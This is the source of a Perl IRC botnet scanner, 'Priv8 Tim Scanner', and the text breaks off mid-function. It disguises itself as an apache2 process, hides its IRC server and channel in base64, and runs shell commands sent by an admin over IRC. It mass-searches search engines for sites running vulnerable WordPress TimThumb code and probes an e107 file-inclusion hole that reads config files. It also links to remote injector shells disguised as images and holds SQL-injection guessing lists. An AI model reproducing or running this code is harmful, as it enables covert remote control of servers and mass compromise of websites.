
#!/usr/bin/perl

###############

#Priv8#########

###############

use HTTP::Request;

use HTTP::Request::Common;

use HTTP::Request::Common qw(POST);

use LWP::Simple;

use LWP 5.64;

use LWP::UserAgent;

use Socket;

use IO::Socket;

use IO::Socket::INET;

use IO::Select;

use MIME::Base64;





my $datetime 	= localtime;

my $fakeproc  	= decode_base64("L3Vzci9zYmluL2FwYWNoZTIgLWsgc3RhcnQ="); 

my $ircserver   = decode_base64("aXJjLmJ5cm9lLm5ldA==");

my $ircport   	= decode_base64("NjY2Nw==");

my $nickname  	= decode_base64("cHJpdls=").int(rand(10))."]8";

my $ident     	= decode_base64("c2Nhbg==");

my $channel   	= decode_base64("I2Jhbms=");

my $admin    	= decode_base64("ZVNTZVI=");

my $fullname  	= decode_base64("UHJpdjggU2Nhbm5lcg==");

my $nob0dy    = "15,1(4@9nob0dy15)";



my $timxlogo   = "15,1(4@9TIMX15)";



my $timlogo  = "15,1(4@9TIM15)";



#decode_base64("IXRpbQ==")

my $timcmd    = '!tim';

my $timxcmd    = '!timx';

my $e107cmd   = '!e107';



#encode injector shells, possibly hardcode them

my $jew  = "http://www.planetbook.it/admin/images/icons/ipays.jpg";

my $botshell  = "http://www.planetbook.it/admin/images/icons/byroe.jpg";

my $botshell2  = "http://www.planetbook.it/admin/images/icons/allnet.jpg";



my @uagents   = ("Microsoft Internet Explorer/4.0b1 (Windows 95)","Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)","Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)","Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)","Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)","Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)","Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)","Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)","Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)","Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)","Mozilla/4.0 (compatible; MSIE 7.0b; Win32)","Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)","Microsoft Pocket Internet Explorer/0.6","Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)","MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)","Advanced Browser (http://www.avantbrowser.com)","Avant Browser (http://www.avantbrowser.com)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)","Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)","Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)","Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511","Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929","Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0","Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox","Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4","Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1","Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b","Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0","Mozilla/3.0 (OS/2; U)","Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)","Mozilla/4.61 (Macintosh; I; PPC)","Mozilla/4.61 [en] (OS/2; U)","Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)","Mozilla/4.8 [en] (Windows NT 5.0; U)");

my $uagent    = $uagents[rand(scalar(@uagents))];



my @tabele		= ('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',

					'name','names','nombre','nombres','usuarios','member','members','admin_table','miembro','miembros','membername','admins','administrator',

					'administrators','passwd','password','passwords','pass','Pass','tAdmin','tadmin','user_password','user_passwords','user_name','user_names',

					'member_password','mods','mod','moderators','moderator','user_email','user_emails','user_mail','user_mails','mail','emails','email','address',

					'e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',

					'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',

					'sistema_usuario','sistema_password','contrasena','auth','key','senha','tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member',

					'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','membros','utilizadores','staff','nuke_authors','accounts','account','accnts',

					'associated','accnt','customers','customer','membres','administrateur','utilisateur','tuser','tusers','utilisateurs','password','amministratore','god','God','authors',

					'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members','Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');

my @kolumny		= ('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',

					'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',

					'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',

					'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',

					'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',

					'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');

$SIG{'INT'}   = 'IGNORE';

$SIG{'HUP'}   = 'IGNORE';

$SIG{'TERM'}  = 'IGNORE';

$SIG{'CHLD'}  = 'IGNORE';

$SIG{'PS'}    = 'IGNORE';

chdir("/tmp");

chop (my $priper = ``); # <--- stupid code

$ircserver = "$ARGV[0]" if $ARGV[0];

$0 = "$fakeproc"."\0" x 16;;

my $pid = fork;

exit if $pid;

die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);



our %irc_servers;

our %DCC;

my $dcc_sel = new IO::Select->new();

$sel_client = IO::Select->new();

sub sendraw {

    if ($#_ == '1') {

    my $socket = $_[0];

    print $socket "$_[1]\n";

    } else {

        print $IRC_cur_socket "$_[0]\n";

    }

}



sub connector {

    my $mynick = $_[0];

    my $ircserver_con = $_[1];

    my $ircport_con = $_[2];

    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);

    if (defined($IRC_socket)) {

        $IRC_cur_socket = $IRC_socket;

        $IRC_socket->autoflush(1);

        $sel_client->add($IRC_socket);

		$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";

        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";

        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;

        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;

        nick("$mynick");

        my $versi   = "' 9,1-= 3[ 4[ 3SAMURAI 4] 3] 9=-";

        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$versi");

        sleep (1);}}

        

sub parse {

    my $servarg = shift;

    if ($servarg =~ /^PING \:(.*)/) {

        sendraw("PONG :$1");

    }

    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {

        if (lc($1) eq lc($mynick)) {

            $mynick = $4;

            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;

        }

    }

    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {

        nick("$mynick".int rand(1));

    }

    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {

        $mynick = $2;

        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;

        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";

        sendraw("MODE $mynick +Bx");

        sendraw("JOIN $channel");

        sleep(2);

        #sendraw("PRIVMSG $admin :Hi $admin im here !!!");

    }

}



my $line_temp;



while( 1 ) {

    while (!(keys(%irc_servers))) { &connector("$nickname", "$ircserver", "$ircport"); }

    select(undef, undef, undef, 0.01);;

    delete($irc_servers{''}) if (defined($irc_servers{''}));

    my @ready = $sel_client->can_read(0);

    next unless(@ready);

    foreach $fh (@ready) {

        $IRC_cur_socket = $fh;

        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};

        $nread = sysread($fh, $ircmsg, 4096);

        if ($nread == 0) {

            $sel_client->remove($fh);

            $fh->close;

            delete($irc_servers{$fh});

        }

        @lines = split (/\n/, $ircmsg);

        $ircmsg =~ s/\r\n$//;



        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {

            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);

			my $engine ="GooGLe,ReDiff,Bing,ALtaViSTa,AsK,UoL,CluSty,GutSer,GooGle2,ExaLead,VirgiLio,WebDe,AoL,SaPo,DuCk,YauSe,BaiDu,KiPoT,GiBLa,YahOo,HotBot,LyCos,LyGo,BLacK,oNeT,SiZuka,WaLLa,DeMos,RoSe,SeZnaM,TisCali,NaVeR";

            if ($path eq $mynick) {

                if ($msg =~ /^ PING (.*) /) {

                    sendraw("NOTICE $nick : PING $1 ");

                }

                if ($msg =~ /^ VERSION /) {

                    sendraw("NOTICE $nick :VERSION mIRC v6.17 Khaled Mardam-Bey");

                }

                if ($msg =~ /^ TIME /) {

                    sendraw("NOTICE $nick : TIME ".$datetime." ");

                }

                if (&isAdmin($nick) && $msg eq "!die") {

                    &shell("$path","kill -9 $$");

                }

                if (&isAdmin($nick) && $msg eq "!killall") {

                    &shell("$path","killall -9 perl");

                }

                if (&isAdmin($nick) && $msg eq "!reset") {

                    sendraw("QUIT :Restarting...");

                }

                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {

                    sendraw("JOIN #".$1);

                }

                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {

                    sendraw("PART #".$1);

                }

                if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {

                    sendraw("NICK ".$1);

                }



                if (&isAdmin($nick) && $msg !~ /^!/) {

                    &shell("$nick","$msg");

                }

		if (&isAdmin($nick) && $msg=~ /^$cmdlfi\s+(.*?)\s+(.*)/){

			my $url = $1.$lfdtest;

			my $cmd = $2;

			&cmdlfi($url,$cmd,$nick);

		}

		if (&isAdmin($nick) && $msg=~ /^$cmdxml\s+(.*?)\s+(.*)/){

			my $url = $1;

			my $cmd = $2;

			&cmdxml($url,$cmd,$nick);

		}

		if (&isAdmin($nick) && $msg=~ /^$cmde107\s+(.*?)\s+(.*)/){

			my $url = $1;

			my $cmd = $2;

			&cmde107($url,$cmd,$nick);

		}

	   }else{

                if (&isAdmin($nick) && $msg eq "!die") {

                    &shell("$path","kill -9 $$");

                }

                if (&isAdmin($nick) && $msg eq "!killall") {

                    &shell("$path","killall -9 perl");

                }

                if (&isAdmin($nick) && $msg eq "!reset") {

                    sendraw("QUIT :Restarting...");

                }

                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {

                    sendraw("JOIN #".$1);

                }

                if (&isAdmin($nick) && $msg eq "!part") {

                    sendraw("PART $path");

                }

                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {

                    sendraw("PART #".$1);

                }

                if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {

                    &shell("$path","$1");

                }

                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {

                    &shell("$path","$1");

                }



                ##################################################################### HELP COMMAND



                if ($msg=~ /^!help/) {

                    my $helplogo = "15,1(4@9HELP15)";

                    &msg("$path","$helplogo 9!tim all <dork>     !timx <url>");

                    &msg("$path","$helplogo 4by eSSeR");

                    

                }

                if ($msg=~ /^!about/) {

                    my $aboutlogo = "15,1(4@9ABOUT15)";

                    &msg("$path","$aboutlogo 9Priv8 Tim Scanner 4by eSSeR");

                }

                

                if ($msg=~ /^!version/) {

                    my $versionlogo = "15,1(4@9VERSION15)";

                    &msg("$path","$versionlogo 9Priv8 Tim Scanner 4by eSSeR");

                }

                

                if ($msg=~ /^!respon/ || $msg=~ /^!id/) {

                    if (&isFound($99,"ipays")) {

                        &msg("$path","15,1(4@9ABOUT15) 9Injector found!");

                    } else {

                        &msg("$path","15,1(4@9ABOUT15) 9Injector dead!");

                    }

                }



                if ($msg=~ /^!dns\s+(.*)/){ 

                       my $nsku = $1;

                       $mydns = inet_ntoa(inet_aton($nsku));

                       &msg("$path", "15,1(4@9DNS15) 9$nsku = $mydns");   

                }



		if ($msg=~ /^!port\s+(.*?)\s+(.*)/ ) {

			my $hostip= "$1";

			my $portsc= "$2";

			my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $portsc, Proto =>'tcp', Timeout => 7);

			if ($scansock) {

			  &msg("$path","15,1(4@9CHECKPORT15) 9$hostip @ $portsc = OPEN");

			}

			else {

			  &msg("$path","15,1(4@9CHECKPORT15) 9$hostip @ $portsc = CLOSED");

			}

		}



		if ($msg=~ /^!base64 (.*)$/ ) {

			if (my $pid = fork) { waitpid($pid, 0); } else {

				if (fork) { exit; } else {

				my $hash      = $1;

				my $base64_encoded = encode_base64($hash);

				my $base64_decoded = decode_base64($hash);

				&msg("$path","15,1(4@9DECODE15) 9$base64_decoded");

				&msg("$path","15,1(4@9ENCODE15) 9$base64_encoded");

				}

				exit;

			}

		}

 

                if ($msg=~ /^$lficmd\s+(.+?)\s+(.*)/) {

                    if (my $pid = fork) {

                        waitpid($pid, 0);

                    }

                    else {

                        if (fork) { exit; } else {

                            

                                my ($bug,$dork) = ($1,$2);

                                &scan_start($path,$bug,$dork,$engine,2);



                        }

                        exit;

                    }

                }

		# Priv8 TimThumb Scan+Auto ###################################################

		##############################################################################

		##############################################################################

		##############################################################################

		##############################################################################

		##############################################################################

		##############################################################################

		##############################################################################     

                ################################################################### TIM SCAN #

                if ($msg=~ /^$timcmd\s+(.*)/) {

                    if (my $pid = fork) {

                        waitpid($pid, 0);

                    }

                    else {

                        if (fork) { exit; } else {

                        	my ($dork) = ($1);

                           	&scan_start($path,'',$dork,$engine,1);

                        }

                        exit;

                    }

                }

		# Priv8 TimThumb Scan+Auto ###################################################

		##############################################################################

		##############################################################################

		##############################################################################

		##############################################################################

		##############################################################################

		##############################################################################

		##############################################################################     

                ################################################################### TIM SCAN #		

            }

        }



        for(my $c=0; $c<= $#lines; $c++) {

            $line = $lines[$c];

            $line = $line_temp.$line if ($line_temp);

            $line_temp = '';

            $line =~ s/\r$//;

            unless ($c == $#lines) {

                &parse("$line");

            } else {

                if ($#lines == 0) {

                    &parse("$line");

                } elsif ($lines[$c] =~ /\r$/) {

                    &parse("$line");

                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {

                    &parse("$line");

                } else {

                    $line_temp = $line;

                }

            }

        }

    }

}





#########################################

#########################################

#########################################

#########################################

#########################################

################################## TYPE #

sub type () {

my ($chan,$bug,$dork,$engine,$type) = @_;

	   if ($type == 1){&tim($chan,'',$dork,$engine);}

	elsif ($type == 2){&timx($chan,$bug,$dork,$engine);}

}

#########################################

#########################################

#########################################



sub scan_start() {

my ($chan,$bug,$dork,$engine,$type) = @_;

    if ($engine =~ /google/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"GooGLe",$type);

        } exit; }

    }

	

    if ($engine =~ /google2/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"GooGle2",$type);

        } exit; }

    }

	

    if ($engine =~ /bing/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"Bing",$type);

        } exit; }

    }

	

    if ($engine =~ /altavista/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"ALtaViSTa",$type);

        } exit; }

    }

	

    if ($engine =~ /ask/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"AsK",$type);

        } exit; }

    }



    if ($engine =~ /uol/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"UoL",$type);

        } exit; }

    }



    if ($engine =~ /yahoo/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"YahOo",$type);

        } exit; }

    }

	

    if ($engine =~ /clusty/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"CluSty",$type);

        } exit; }

    }

	

    if ($engine =~ /gutser/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

            &type($chan,$bug,$dork,"GutSer",$type);

        } exit; }

    }

	

    if ($engine =~ /rediff/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"ReDiff",$type);

        } exit; }

    }



    if ($engine =~ /virgilio/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"VirgiLio",$type);

        } exit; }

    }



    if ($engine =~ /webde/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"WebDe",$type);

        } exit; }

    }



    if ($engine =~ /exalead/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"ExaLead",$type);

        } exit; }

    }

	

    if ($engine =~ /lycos/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"LyCos",$type);

        } exit; }

    }



    if ($engine =~ /hotbot/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"HotBot",$type);

        } exit; }

    }



    if ($engine =~ /aol/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"AoL",$type);

        } exit; }

    }

	

    if ($engine =~ /sapo/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"SaPo",$type);

        } exit; }

    }

	

    if ($engine =~ /duck/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"DuCk",$type);

        } exit; }

    }



    if ($engine =~ /lygo/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"LyGo",$type);

        } exit; }

    }



    if ($engine =~ /yause/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"YauSe",$type);

        } exit; }

    }



    if ($engine =~ /baidu/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"BaiDu",$type);

        } exit; }

    }



    if ($engine =~ /kipot/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"KiPoT",$type);

        } exit; }

    }



    if ($engine =~ /gibla/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"GiBLa",$type);

        } exit; }

    }



    if ($engine =~ /black/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"BLacK",$type);

        } exit; }

    }



	if ($engine =~ /onet/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"oNeT",$type);

        } exit; }

    }



	if ($engine =~ /sizuka/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"SiZuka",$type);

        } exit; }

    }



	if ($engine =~ /walla/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"WaLLa",$type);

        } exit; }

    }



	if ($engine =~ /demos/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"DeMos",$type);

        } exit; }

    }



	if ($engine =~ /rose/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"RoSe",$type);

        } exit; }

    }



	if ($engine =~ /seznam/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"SeZnaM",$type);

        } exit; }

    }



	if ($engine =~ /tiscali/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"TisCali",$type);

        } exit; }

    }



	if ($engine =~ /naver/i) {

        if ($pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

		&type($chan,$bug,$dork,"NaVeR",$type);

        } exit; }

    }

}



#########################################







sub tim() {

    my $chan = $_[0];

    my $bug = $_[1];

    my $dork = $_[2];

    my $engine = $_[3];

    my $count = 0;

    my @list = &search_engine($chan,'',$dork,$engine,$oscologo);

    my $num = scalar(@list);

    if ($num > 0) {

        foreach my $site (@list) {

            

            $count++;

            if ($count == $num-1) { &msg("$chan","$timlogo Scan finish"); }

            my $secret = "http://flickr.com.machomantshirt.com/php.php";

            my $xp1 = "/wp-content/plugins/simple-post-thumbnails/cache/";

            my $xp2 = "/wp-content/plugins/uBillboard/cache/";

            my $xp3 = "/wp-content/themes/XSBasico/timthumb/cache/";

            my $xp4 = "/wp-content/themes/Minimal/cache/";

            my $xp5 = "/wp-content/plugins/simple-post-thumbnails/cache/";

            my $xp6 = "/wp-content/plugins/wordpress-popular-posts/cache/";

            my $xp7 = "/wp-content/themes/realtorpress/thumbs/cache/";

          

            

           

	    

	    if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

	    

	       		###############################1

	    	   
                    my $test1 = &get_content("http://".$site."/pdf.php"); #simple post thumbnail
		             if ($test1 =~ /Please login to generate the pdf document/ ) {
					 &msg("$chan","15,1(4@9TOM15) 9 http://".$site);

		    } 

		       ######################################2


		    

		    

		    

            } exit; sleep(2); }

        }

    }

}















sub e107xpl1() {

    my $chan   = $_[0];

    my $site   = $_[1];

    my $engine = $_[2];

      my $test = "http://".$site."e107_plugins/my_gallery/image.php?file=../../e107_config.php";

      my $re   = &get_content($test);

         if ($re =~ /http:\/\//){

            &osql_xpl($test,$chan,$site);

        }

 }















                         #######################################################################

                         #######################################################################

                         #######################################################################

                         #######################################################################

                         #######################################################################

                         ######################################################## SEARCH STUFF #

                         

sub search_engine() {

    my (@total,@clean);

    my $chan = $_[0];

    my $bug = $_[1];

    my $dork = $_[2];

    my $engine = $_[3];

    my $logo = $_[4];

    if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google); }

    if ($engine eq "ReDiff") { my @rediff = &rediff($dork); push(@total,@rediff); }

    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }

    if ($engine eq "ALtaViSTa") { my @altavista = &altavista($dork); push(@total,@altavista); }

    if ($engine eq "YahOo") { my @yahoo = &yahoo($dork); push(@total,@yahoo); }

    if ($engine eq "AsK") { my @ask = &ask($dork); push(@total,@ask); }

    if ($engine eq "UoL") { my @uol = &uol($dork); push(@total,@uol); }

    if ($engine eq "CluSty") { my @clusty = &clusty($dork); push(@total,@clusty); }

    if ($engine eq "GutSer") { my @gutser = &gutser($dork); push(@total,@gutser); }

    if ($engine eq "GooGle2") { my @google2 = &google2($dork); push(@total,@google2); }

    if ($engine eq "ExaLead") { my @exalead = &exalead($dork); push(@total,@exalead); }

    if ($engine eq "LyCos") { my @lycos = &lycos($dork); push(@total,@lycos); }

    if ($engine eq "VirgiLio") { my @virgilio = &virgilio($dork); push(@total,@virgilio); }

    if ($engine eq "WebDe") { my @webde = &webde($dork); push(@total,@webde); }

    if ($engine eq "HotBot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }

    if ($engine eq "AoL") { my @aol = &aol($dork); push(@total,@aol); }

    if ($engine eq "SaPo") { my @sapo = &sapo($dork); push(@total,@sapo); }

    if ($engine eq "DuCk") { my @duck = &duck($dork); push(@total,@duck); }

    if ($engine eq "LyGo") { my @lygo = &lygo($dork); push(@total,@lygo); }

    if ($engine eq "YauSe") { my @yause = &yause($dork); push(@total,@yause); }

    if ($engine eq "BaiDu") { my @baidu = &baidu($dork); push(@total,@baidu); }

    if ($engine eq "KiPoT") { my @kipot = &kipot($dork); push(@total,@kipot); }

    if ($engine eq "GiBLa") { my @gibla = &gibla($dork); push(@total,@gibla); }

    if ($engine eq "BLacK") { my @black = &black($dork); push(@total,@black); }

    if ($engine eq "oNeT") { my @onet = &onet($dork); push(@total,@onet); }

    if ($engine eq "SiZuka") { my @sizuka = &sizuka($dork); push(@total,@sizuka); }

    if ($engine eq "WaLLa") { my @walla = &walla($dork); push(@total,@walla); }

    if ($engine eq "DeMos") { my @demos = &demos($dork); push(@total,@demos); }

    if ($engine eq "RoSe") { my @rose = &rose($dork); push(@total,@rose); }

    if ($engine eq "SeZnaM") { my @seznam = &seznam($dork); push(@total,@seznam); }

    if ($engine eq "TisCali") { my @tiscali = &tiscali($dork); push(@total,@tiscali); }

    if ($engine eq "NaVeR") { my @naver = &naver($dork); push(@total,@naver); }

    @clean = &clean(@total);

    &msg("$chan","$logo( 4@ 3$engine 15) 4 Total: 15 (".scalar(@total).") 4 Clean: 15 (".scalar(@clean).") ");

    return @clean;

}



				#######################################################################



sub isFound() {

    my $status = 0;

    my $link = $_[0];

    my $reqexp = $_[1];

    my $res = &get_content($link);

    if ($res =~ /$reqexp/) { $status = 1 }

    return $status;

}



sub get_content() {

    my $url = $_[0];

    my $ua = LWP::UserAgent->new(agent => $uagent);

    $ua->timeout(7);

    my $req = HTTP::Request->new(GET => $url);

    my $res = $ua->request($req);

    return $res->content;

}



sub google() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=400; $i+=10){

        my $search = ("http://www.google.com/search?q=".&key($key)."&num=100&filter=0&start=".$i);

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {

            if ($1 !~ /google/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub rediff() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=500; $i+=10) {

